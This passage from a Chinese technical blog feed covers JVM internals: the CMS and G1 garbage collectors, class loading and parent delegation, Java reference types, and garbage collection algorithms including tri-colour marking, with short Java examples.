<h2 id="CMS收集器"><a href="#CMS收集器" class="headerlink" title="CMS收集器"></a>CMS收集器</h2><p>CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。它是基于标记-清除算法实现的，它的运作过程相对复杂一些，分为四个步骤：</p>
<ol>
<li><strong>初始标记</strong>（CMS initial mark）</li>
<li><strong>并发标记</strong>（CMS concurrent mark）</li>
<li><strong>重新标记</strong>（CMS Remark）</li>
<li><strong>并发清除</strong>（CMS Concurrent sweep）</li>
</ol>
<p>初始标记和重新标记阶段仍然需要STW。初始阶段仅仅只是标记一下GC Roots能直接关联的对象，速度很快</p>
<p>并发标记阶段就是从GC Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长，但是不需要停止用户线程；</p>
<p>重新标记阶段是为了修正并发标记期间，因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录。这个阶段的停止时间通常比初始阶段长一些，但是远比并发标记阶段的时间短。</p>
<p>并发清除阶段，清理删除掉标记阶段判断已经死亡的对象，由于不需要移动存活的对象，所以这个阶段也是可以与用户线程同时并发的。</p>
<p>CMS收集器的优点：并发收集、低停顿，但是CMS还远远达不到完美，主要有三个显著缺点：cpu敏感，浮动垃圾，空间碎片。</p>
<p>CMS收集器对CPU资源非常敏感。在并发阶段，虽然不会导致用户线程停顿，但是会占用CPU资源而导致引用程序变慢，总吞吐量下降。CMS默认启动的回收线程数是：(CPU数量+3) / 4。</p>
<p>CMS收集器无法处理浮动垃圾，可能出现“Concurrent Mode Failure“，失败后而导致另一次Full  GC的产生。由于CMS并发清理阶段用户线程还在运行，伴随程序的运行自热会有新的垃圾不断产生，这一部分垃圾出现在标记过程之后，CMS无法在本次收集中处理它们，只好留待下一次GC时将其清理掉。这一部分垃圾称为“浮动垃圾”。</p>
<p>CMS是基于“标记-清除”算法实现的收集器，使用“标记-清除”算法收集后，会产生大量碎片。空间碎片太多时，将会给对象分配带来很多麻烦，比如说大对象，内存空间找不到连续的空间来分配不得不提前触发一次Full  GC。为了解决这个问题，CMS收集器提供了一个-XX:UseCMSCompactAtFullCollection开关参数，用于在Full  GC之后增加一个碎片整理过程，还可通过-XX:CMSFullGCBeforeCompaction参数设置执行多少次不压缩的Full  GC之后，跟着来一次碎片整理过程。</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-collector5.jpg" alt="CMS收集器"></p>
<h2 id="Garbage-First收集器"><a href="#Garbage-First收集器" class="headerlink" title="Garbage First收集器"></a>Garbage First收集器</h2><p>Garbage First （简称G1）收集器是一款主要面向服务端应用的垃圾收集器。G1除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不得超过N毫秒。G1开创的基于Region的堆内存布局是它能实现这个目标的关键。</p>
<p>G1不再坚持固定大小和固定数量的分代区域划分，而是把连续的Java对划分为多个大小相等的独立区域（Region），每一个Region可以根据需要扮演新生代的Eden空间、Survivor空间或者老年代空间。收集器能够对扮演不同角色的Region采用不同的策略去处理。</p>
<p>Region中还有一类特殊的Humongous区域，专门用来存储大对象。G1认为只要大小超过了一个Region容量一半的对象即可判断为大对象。每个Region的大小可以通过参数-XX：G1HeapRegionSize设定，取值范围为1MB-32MB，且应为2的N次幂。对于那些超过了整个Region的超级大对象，将会被存放在N个连续的Humongous Region之中，G1大多数行为都把Humongous Region作为老年代的一部分来看待。</p>
<p>G1收集器的运作过程大致也可以分为以下四个步骤：</p>
<ol>
<li><strong>初始标记</strong>（Initial Marking）：标记一下GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成，所以G1收集器在这个阶段实际并没有额外的停顿。</li>
<li><strong>并发标记</strong>（Concurrent Marking）：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。当对象图扫描完成以后，还要重新处理STAB记录下的在并发时有引用变动的对象。</li>
<li><strong>最终标记</strong>（Final Marking）：对用户线程做另一个短暂的暂停，用于处理并发阶段结束后仍留下来的最后那少量的SATB记录。</li>
<li><strong>筛选回收</strong>（Live Data Counting and Evacuation）：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成的回收集，然后把决定回收的那一部分Region的存活对象复制到空Region中，再清理掉整个旧Region的全部空间。</li>
</ol>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>垃圾回收器</tag>
        <tag>G1</tag>
        <tag>Garbage First</tag>
        <tag>CMS</tag>
        <tag>Concurrent Mark Sweep</tag>
      </tags>
  </entry>
  <entry>
    <title>Java类加载模型</title>
    <url>/2020/04/03/Java/JVM/2020-03-29-Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="Java类加载模型"><a href="#Java类加载模型" class="headerlink" title="Java类加载模型"></a>Java类加载模型</h1><h2 id="类加载时机"><a href="#类加载时机" class="headerlink" title="类加载时机"></a>类加载时机</h2><p>一个类型从被夹在到虚拟机内存中开始，到卸载到出内存位置，它的整个生命周期将会经历加载、验证、准备、解析、初始化、使用和卸载七个阶段，其中验证、准备、解析三个部分统称为连接。这几个顺序如下所示：</p>
<p><img src="https://huhansi.github.io/images/2020-04-03-leijiazaiguocheng.png" alt="类加载过程"></p>
<h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p>在加载阶段，Java虚拟机需要完成以下三件事：</p>
<ol>
<li>通过一个类的全限定名来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的的静态存储结构转化为方法取得运行时数据结构</li>
<li>在内存中生成一个代表这个类的Java.lang.Class对象，作为方法区这个类的各种数据访问入口</li>
</ol>
<p>对于数组类型而言，情况就有所不同，数组类本身不通过类加载器创建，它是由Java虚拟机直接在内存中动态构造出来的。但数组类与类加载器仍然有很密切的关系，因为数组类的元素类型最终还是要考类加载器来完成加载，一个数组类C创建过程遵循以下规则：</p>
<ul>
<li>如果数组的组件类型（Component Type，子的事数组去掉一个维度的类型，注意和前面的元素类型区分开来）是引用类型，那就递归去加载这个组件类型，数组C将被标识在加载该组件类型的类加载器的类名称空间上。</li>
<li>如果数组的组件类型不是引用类型（例如int[]数组的组件类型为int），Java虚拟机将会把数组C标记为与引导类加载器关联</li>
<li>数组类的可访问性与它的组件类型的可访问性一致，如果组件类型不是引用类型，它的数组类的可访问性将默认为public，可被所有的类和接口访问到。</li>
</ul>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>验证的目的是确保Class文件的字节流中包含的信息符合《Java虚拟机规范》的全部约束要求，保证这些信息被当做代码运行后不会危害虚拟机自身的安全。</p>
<p>验证阶段大致会完成下面四个阶段的检验动作：<strong>文件格式验证</strong>、<strong>元数据验证</strong>、<strong>字节码验证</strong>和<strong>符号引用验证</strong>。</p>
<h4 id="文件格式验证"><a href="#文件格式验证" class="headerlink" title="文件格式验证"></a>文件格式验证</h4><p>主要是验证字节流是否符合Class文件格式规范，并且能被当前版本的虚拟机处理。这阶段的验证是基于二进制字节流进行的，只有通过了这个阶段的验证之后，这段字节流才被允许进入Java虚拟机内部的方法区进行存储，所以后面的三个验证阶段全部是基于方法区的存储结构上进行的，不会再直接读取、操作字节流了。</p>
<h4 id="元数据验证"><a href="#元数据验证" class="headerlink" title="元数据验证"></a>元数据验证</h4><p>这个阶段是对字节码描述的信息进行语义分析，以保证其描述的信息符合《Java语言规范》的要求。</p>
<h4 id="字节码验证"><a href="#字节码验证" class="headerlink" title="字节码验证"></a>字节码验证</h4><p>这个阶段主要目的是通过数据流分析和控制流分析，确定程序语义是合法的、符合逻辑的。这个阶段是对类的方法体（Class文件中的Code属性）进行校验分析，保证被校验类的方法在运行时不会做出危害虚拟机安全的行为。</p>
<h4 id="符号引用验证"><a href="#符号引用验证" class="headerlink" title="符号引用验证"></a>符号引用验证</h4><p>符号引用验证的主要目的是确保解析行为能正常执行，如果无法通过符号引用验证，Java虚拟机将会抛出一个Java.lang.IncompatibleClassChangeError的子类异常，比如：java.lllegalAccessError、java.lang.NoSuchFieldError等。</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>准备阶段是正式为类中定义的变量（即静态变量，被static修饰的变量）分配内存并设置类变量初始值的阶段。</p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>解析阶段是Java虚拟机将常量池内的符号引用替换为直接引用的过程。</p>
<ul>
<li><p>符号引用（Symbolic Reference）：符号引用以一组符号来描述所引用的目标，符合可以是任何形式的字面量，只要使用时能无歧义地定位到目标即可。</p>
</li>
<li><p>直接引用（Direct Reference）：直接引用是可以直接指向目标的指针、相对偏移量或者是一个能间接定位到目标的句柄。</p>
</li>
</ul>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>《Java虚拟机规范》严格规定了有且只有六种情况必须立即对类进行“初始化”：</p>
<ul>
<li>遇到new、getstatic、putstatic或invokestatic这四条字节码指令时，如果类型没有进行过初始化，则需要触发其初始化阶段。<ul>
<li>使用new关键字实例化对象的时候</li>
<li>读取或设置一个类型的静态字段（被final修饰、已在编译期把结果放入常量池的静态字段除外）的时候</li>
<li>调用一个类型的静态方法的时候。</li>
</ul>
</li>
<li>使用java.lang.reflect包的方法对类型进行反射调用的时候，如果类型没有进行过初始化，则需要先触发其初始化</li>
<li>当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化</li>
<li>当虚拟机启动时，用户需要制定一个执行的主类，虚拟机会先初始化这个主类</li>
<li>当使用JDK 7新加入的动态语言支持时，如果一个java.lang.invoke.MethodHandle实例最后的解析结果为REF_getStatic、REF_putStatic、REF_invokeStatic、REF_newInvokeSpecial四种类型的方法句柄，并且这个方法句柄对应的类没有初始化，则需要先触发其初始化。</li>
<li>当一个接口定义了JDK 8新加入的默认方法（被default关键字修饰的接口方法）时，如果有这个接口的实现类发生了初始化，那该接口要在其之前被初始化。</li>
</ul>
<p>初始化阶段是执行类构造器&lt;cinit&gt;()方法的过程。&lt;cinit&gt;()方法并不是程序员在Java代码中直接编写的方法，它是Javac编译器的自动生成物。</p>
<ul>
<li>&lt;cinit&gt;()方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块（static {}}中的语句合并产生的，编译器收集的顺序是由语句在源文件中出现的顺序决定的，静态语句块中只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块中可以赋值，但不能访问。</li>
</ul>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>类加载器的作用就是通过一个类的全限定名来获取描述该类的二进制字节流。对于任意一个类，都必须由加载它的类加载器和这个类本身一起共同确定其在Java虚拟机中的唯一性，每一个类加载器，都拥有一个独立的类名称空间。</p>
<p>换句话说就是：比较两个类是否“相等”，只有在这两个类是由同一个类加载器加载的前提下才有意义，否则即使这两个类来源于同一个Class文件，被同一个Java虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相等。</p>
<p>下面看个例子（例子来源于《深入理解Java虚拟机》）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		ClassLoader myLoader = <span class="keyword">new</span> ClassLoader() &#123;</span><br><span class="line"></span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">			</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					String fileName = name.substring(name.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>) + <span class="string">".class"</span>;</span><br><span class="line">					InputStream is = getClass().getResourceAsStream(fileName);</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">null</span> == is) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[is.available()];</span><br><span class="line">					is.read(b);</span><br><span class="line">					<span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">				&#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">				&#125;</span><br><span class="line">			</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		Object obj = myLoader.loadClass(<span class="string">"com.test.ClassLoaderTest"</span>).newInstance();</span><br><span class="line">		System.out.println(obj.getClass());</span><br><span class="line">		System.out.println(obj <span class="keyword">instanceof</span> com.test.ClassLoaderTest);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下图：</p>
<p><img src="https://huhansi.github.io/images/2020-04-06-classloader.png" alt="类加载器测试结果"></p>
<p>从上述结果看，这个类确实是com.test.ClassLoaderTest实例化出来的，但是第二行用instanceOf的检验结果却是false。这是Java虚拟机中同时存在了两个ClassLoaderTest类，一个是由虚拟机的应用程序类加载器所加载的，另外一个是由自定义的类加载器加载的。</p>
<h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><p>绝大多数Java应用会用到以下三个系统提供的类加载器进行加载：</p>
<ul>
<li>启动来加载器（Bootstrap Class Loader）：这个类加载器是使用C++语言实现的，是虚拟机的一部分，它负责加载存放在<JAVA_HOME>\lib目录，或者被-Xbootclasspath参数所指定的路径中存放的，而且是Java虚拟机能够识别的（按照文件名识别，如rt.jva 、tools.java，名字不符合的类库即使放在lib目录页不会被加载）类库加载到虚拟机的内存中。启动类加载器无法被Java程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给引导类加载器去处理，那直接使用null代替即可。</JAVA_HOME></li>
<li>扩展类加载器（Extension Class Loader）：这个类加载器是在类sun.misc.Launcher$ExtClassLoader中以Java代码的形式实现的。它负责加载<JAVA_HOME>\lib\ext目录中，或者被java.ext.dirs系统变脸所指定的路径中所有的类库。</JAVA_HOME></li>
<li>应用程序类加载器（Application Class Loader)：这个类加载器由sun.misc.Launcher$AppClassLoader来实现。它负责加载用户类路径上所有的类库。如果应用程序没有自定义过自己的类加载器，一般情况下这个就是程序中的默认加载器。</li>
</ul>
<p>这些类加载器之间的层次关系被称为类加载器的“双亲委派模型”。双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。不过这里类加载器之间的斧子关系一般不是以集成的关系来实现的，而是通常使用组合关系来复用父加载器的代码。</p>
<p><img src="https://huhansi.github.io/images/2020-04-02-shaungqingweipai.png" alt="类加载器的双亲委派模型"></p>
<p>双亲委派模型的工作过程是：如果一个类加载器受到了类加载的请求，它首先不会自己去尝试加载这类，而是把这个请求委派个父类加载器去完成，每一个层次的类加载器都是如此，因此，所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。<br>使用双亲委派模型来组织类加载器之间的关系好处就是：Java中类随着它的类加载器一起具备了一种带有优先级的层级关系。</p>
<h3 id="破坏双亲委派模型"><a href="#破坏双亲委派模型" class="headerlink" title="破坏双亲委派模型"></a>破坏双亲委派模型</h3><p>比如JDBC，它的相关类是由启动类加载器进行加载的，但是它的实现类，是由各个数据库厂商自己定义实现的，启动类加载器是不可能识别到这些类的。</p>
<p>为了解决这个问题，Java引入了线程上下文类加载器。这个类加载器可以通过java.lang.Thead类的setContextClassLoader()方法进行设置，如果创建线程程时还未设置，它将会从父线程中集成一个，如果在应用程序的全局范围内都没有设置过得话，这个线程类加载器默认就是应用程序类加载器。</p>
<p>JDBC服务使用这个线程上下文类加载器去加载所需的SPI服务代码，这时一种父类加载器去请求子类加载器完成类加载的行为，这种行为实际上是打通了双亲委派模型的层次结构来逆向使用类加载器。</p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>类加载模型</tag>
        <tag>双亲委派</tag>
        <tag>ClassLoader</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中的4种引用类型</title>
    <url>/2020/04/03/Java/JVM/2020-03-29-Java-%E5%87%A0%E7%A7%8D%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="Java中的4种引用类型"><a href="#Java中的4种引用类型" class="headerlink" title="Java中的4种引用类型"></a>Java中的4种引用类型</h1><h2 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h2><p>强引用是最传统的“引用”的定义，是指在程序代码之中普遍存在的引用赋值，即类似“Object obj = new Object()”这种引用关系。无论任何情况下，只要强引用关系还在，垃圾收集器就永远不会回收掉被引用的对象。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] arr = <span class="keyword">new</span> String[]&#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="软引用"><a href="#软引用" class="headerlink" title="软引用"></a>软引用</h2><p>软引用是用来描述一些还有用，但非必须的对象。只要被软引用关联着的对象，在系统将要发生内存溢出异常前，会把这些对象列进回收范围之中进行第二次回收，如果这次回收还没有足够内存，才会抛出内存溢出异常。在JDK1.2之后，提供了SoftReference类来实现软引用。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例1</span></span><br><span class="line">SoftReference&lt;String[]&gt; softBean = <span class="keyword">new</span> SoftReference&lt;String[]&gt;(<span class="keyword">new</span> String[]&#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//示例2</span></span><br><span class="line">ReferenceQueue&lt;String[]&gt; referenceQueue = <span class="keyword">new</span> ReferenceQueue&lt;String[]&gt;();</span><br><span class="line">SoftReference&lt;String[]&gt; softBean = <span class="keyword">new</span> SoftReference&lt;String[]&gt;(<span class="keyword">new</span> String[]&#123;<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>&#125;, referenceQueue);</span><br></pre></td></tr></table></figure>



<h2 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h2><p>弱引用也是用来描述那些非必须对象，但是它的强度比软引用更弱一些，被弱引用关联的对象只能生存到下一次垃圾收集发生未知。当垃圾收集器开始工作，无论当前内存是否足够，都会回收掉纸杯弱引用关联的对象。在JDK1.2之后，提供了WeakReference类来实现弱引用。</p>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;示例1</span><br><span class="line">WeakReference&lt;String[]&gt; weakBean &#x3D; new WeakReference&lt;String[]&gt;(new String[]&#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;);</span><br><span class="line">&#x2F;&#x2F;示例2</span><br><span class="line">ReferenceQueue&lt;String[]&gt; referenceQueue &#x3D; new ReferenceQueue&lt;String[]&gt;();</span><br><span class="line">WeakReference&lt;String[]&gt; softBean &#x3D; new WeakReference&lt;String[]&gt;(new String[]&#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;, referenceQueue);</span><br></pre></td></tr></table></figure>



<h2 id="虚引用"><a href="#虚引用" class="headerlink" title="虚引用"></a>虚引用</h2><p>虚引用也被称之为“幽灵引用”或者“幻影引用”，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象示例。为一个对象设置虚引用关联的唯一目的只是为了能在这个对象被收集器回收时收到一个系统通知。在JDK1.2之后提供了PhantomReference类来实现虚引用。</p>
<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ReferenceQueue&lt;String[]&gt; referenceQueue &#x3D; new ReferenceQueue&lt;String[]&gt;();</span><br><span class="line">PhantomReference&lt;String[]&gt; referent &#x3D; new PhantomReference&lt;String&gt;(new String[]&#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;, referenceQueue);</span><br></pre></td></tr></table></figure>

<h2 id="多引用类型的可达性判断"><a href="#多引用类型的可达性判断" class="headerlink" title="多引用类型的可达性判断"></a>多引用类型的可达性判断</h2><p>若一个对象的引用类型有多个， 那到底如何判断它的可达性呢？ 其实规则如下： （“单弱多强” ）</p>
<ol>
<li>单条引用链的可达性以最弱的一个引用类型来决定；</li>
<li>多条引用链的可达性以最强的一个引用类型来决定；</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-03-duokeda.jpg" alt="强可达"></p>
<p>上图中，对象 C 虽然被对象 B 软引用着，但是因为存在一条 R-&gt;A-&gt;C 的全是强引用类型的路径，所以对象 C 是强可达的。</p>
<p><img src="https://huhansi.github.io/images/2020-04-03-duokeda1.jpg" alt="软可达"></p>
<p>上图中，对象 A、对象 C 以及对象 D 都是软可达的，虽然对象 C 是被对象 A 强引用着，但是对象 A 本身是软可达的，所以对象 C 也是软可达的。所以你看，一个对象即使被强引用着，也可能是软可达的，比如这里的对象 C；一个对象即使被软引用着，也可能是强可达的，比如强可达那个图里的对象 C。</p>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
        <tag>引用</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的垃圾回收算法</title>
    <url>/2020/04/03/Java/JVM/2020-03-29-Java-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="常见的垃圾回收算法"><a href="#常见的垃圾回收算法" class="headerlink" title="常见的垃圾回收算法"></a>常见的垃圾回收算法</h1><h2 id="分代收集理论"><a href="#分代收集理论" class="headerlink" title="分代收集理论"></a>分代收集理论</h2><p>当前商业虚拟机的垃圾收集器，大多数都遵循了“分代收集”的理论进行设计，分代收集名为理论，实质是一套符合大多数程序运行实际情况的经验法则，它建立在两个分代假说之上：</p>
<ol>
<li>弱分代假说：绝大多数对象都是朝生夕灭的</li>
<li>强分代假说：熬过越多次垃圾收集过程的对象就越难以消亡</li>
</ol>
<p>这两个分代假说共同奠定了多款常用的垃圾收集器的一致的设计原则：收集器应该将Java堆划分出不同的区域，然后将回收对象依据其年龄（即对象熬过垃圾回收的次数）分配到不同的区域之中存储。</p>
<p>但是，还存在一种情况，就是新生代的对象被老年代的对象引用了。为了找出这些对象，不得不遍历整个老年代。虽然理论上方案可行，但是会给回收带来很大的内存损耗。这时就需要对分代收集理论再加上一条经验法则：</p>
<ol>
<li>跨代引用假说：跨代引用相对于同代引用来说仅占极少数。</li>
</ol>
<p>依据这条假说，我们就不应再为了少量的跨代引用去扫描整个老年代，也不必浪费空间专门记录每一个对象是否存在以及存在哪些跨代引用，只需在新生代上简历一个全局的数据结构（该结构被称为“记忆集”， Remembered Set），这个结构把老年代划分为若干小块，表示出老年代的哪一块内存会存在跨代引用。此后，当发生Minor GC时，只有包含了跨代引用的小块内存里的对象才会被加入到GC Roots进行扫描。虽然这种方法需要在对象改变引用关系时维护记录数据的正确定，会增加一些运行时的开销，但比起收集时扫描整个老年代来说认识划算的。</p>
<h2 id="标记-清除"><a href="#标记-清除" class="headerlink" title="标记-清除"></a>标记-清除</h2><p>标记清除算法主要分为两个步骤：标记、清除</p>
<p>标记：标记存活的对象或者标记需要回收的对象</p>
<p>清除：回收未被标记的对象或者回收标记的对象</p>
<p>可参见下图</p>
<p><img src="https://huhansi.github.io/images/2020-04-03-biaojiqingchu.jpg" alt="标记清除算法图示"></p>
<p>标记清除算法存在两个明显的缺点：</p>
<ol>
<li>执行效率不稳定，标记和清除两个过程的执行效率是和对象的数量成反比的；</li>
<li>内存空间碎片化：会产生大量不连续的内存碎片，导致后期无法分配大对象的内存。</li>
</ol>
<h2 id="标记-整理"><a href="#标记-整理" class="headerlink" title="标记-整理"></a>标记-整理</h2><p>标记整理算法和标记清除算法差不多，不同的是，它的第二个步骤是把产生的内存碎片全部移到一起。</p>
<p>标记整理算法也存在比较明显的缺点：</p>
<ol>
<li>移动对象的时候会增加虚拟机停止的时间，也就是STW（Stop The World）的时间。</li>
</ol>
<p><img src="https://huhansi.github.io/images/2020-04-03-biaojizhengli.jpg" alt="标记清除算法图示"></p>
<h2 id="标记-复制"><a href="#标记-复制" class="headerlink" title="标记-复制"></a>标记-复制</h2><p>标记复制算法是为了解决标记清除算法面对大量可回收对象时执行效率低的问题。它把可用内存按照容量划分为大小相等的两块，每次只使用其中的一块。当一块的内存用完了，就将存活着的对象复制到另一块上面，然后把已经使用完的内存空间清空。</p>
<p><img src="https://huhansi.github.io/images/2020-04-03-biaojifuzhi.jpg" alt="标记复制算法图示"></p>
<p>标记复制算法的缺点显而易见：</p>
<ol>
<li>它每次只能使用50%的内存空间，空间利用率太低</li>
</ol>
<h2 id="并发的可达性分析"><a href="#并发的可达性分析" class="headerlink" title="并发的可达性分析"></a>并发的可达性分析</h2><p>标记阶段是所有追踪式垃圾收集算法的共同特征，如果这个阶段会随着堆变大而等比增加停顿时间的话，其影响就会波及几乎所有的垃圾收集器。同理，如果能够消减这部分停顿时间的话，那收益也将会是系统性的。</p>
<p>想解决或者降低用户线程的停顿，就要先搞清楚为什么必须在一个能保障一致性的快照上才能进行对象图的遍历？为了能够解释清楚这个额问题，我们引入三色标价作为工具辅助推导，把遍历对象图过程中遇到的对象，按照“是否访问过”这个条件标记成以下三种颜色：</p>
<ul>
<li>白色：表示对象稍微被垃圾收集器访问过。显然，在可达性分析刚刚开始的阶段，所有的对象都是白色的，若在分析结束的阶段，仍然是白色对象，即代表不可达。</li>
<li>黑色：表示对象已经被垃圾收集器访问过，并且这个对象的所有引用都已经扫描过。黑色的对象代表已经扫描过，它是安全存活的。如果有其他对象引用指向了黑色对象，无需重新扫描以便。黑色对象不可能直接（不经过灰色对象）指向某个白色对象。</li>
<li>灰色：表示对象已经被垃圾收集器访问过，但这个对象上至少还存在一个引用还没有被扫描过。</li>
</ul>
<p>对CMS收集器来说，用户线程和标记线程是同时工作的，那么可能存在两种情况：</p>
<ol>
<li>将原本已经消亡的对象标记为存活，虽然不是什么好事，但是可以接受</li>
<li>将原来的存活对象误标识为已消亡，可以回收，那就是致命的问题。</li>
</ol>
<p>下面几张图就演示了这种情况是如何发生的：</p>
<p><img src="https://huhansi.github.io/images/2020-04-04-sanse1.png" alt="初始状态"></p>
<p>初始状态，只有GC Roots是黑色的。</p>
<p><img src="https://huhansi.github.io/images/2020-04-04-sanse2.png" alt="扫描中"></p>
<p>扫描过程中，以灰色为波峰的波纹从黑向白推进</p>
<p><img src="https://huhansi.github.io/images/2020-04-04-sanse3.png" alt="扫描完成"></p>
<p>扫描顺利完成，此时黑色对象就是存活对象，白色对象就是已消亡可回收对象</p>
<p><img src="https://huhansi.github.io/images/2020-04-04-sanse4.png" alt="对象消失情况1"></p>
<p>在扫描的过程中，用户取消了灰色对象B到C的引用，同时又增加了A到C的引用。因为此时A已经完成扫描，是为黑色，所以A不会再次扫描，除了A之外，再也无其他对象指向C，C就成为了消失的对象。</p>
<p><img src="https://huhansi.github.io/images/2020-04-04-sanse5.png" alt="对象消失情况2"></p>
<p>此时，删除了灰色对象B到白色对象C的引用，新增了黑色对象A到白色对象D的引用。因为A对象不会再次扫描，没有其他对象指向C，此时，C和D对象就成了消失的对象。</p>
<h3 id="对象消失的条件"><a href="#对象消失的条件" class="headerlink" title="对象消失的条件"></a>对象消失的条件</h3><p>Wilson于1994年从理论上证明了，当且仅当以下两个条件同时满足时，会产生“对象消失”问题。即原本应是黑色的对象被误标为白色：</p>
<ul>
<li>赋值器插入了一条或多条从黑色对象到白色对象的引用；</li>
<li>赋值器删除了全部从灰色对象到该白色对象的直接或间接引用。</li>
</ul>
<p>因此，要解决并发扫描时的对象消失问题，只需要破坏这两个条件中的任意一个即可。由此分别产生了两种解决方案：<strong>增量更新</strong>和<strong>原始快照</strong>。</p>
<h4 id="增量更新"><a href="#增量更新" class="headerlink" title="增量更新"></a>增量更新</h4><p>增量更新破坏的是第一个条件，当黑色对象插入新的指向白色对象的引用关系时，就将这个新插入的引用记录下来，等并发扫描结束之后，再将这些记录过的引用关系中的黑色对象为根，再扫描一次。这可以简化理解为，黑色对象一旦新插入了指向白色对象的引用之后，它就变回灰色对象了。CMS是基于增量更新来做并发标记的。</p>
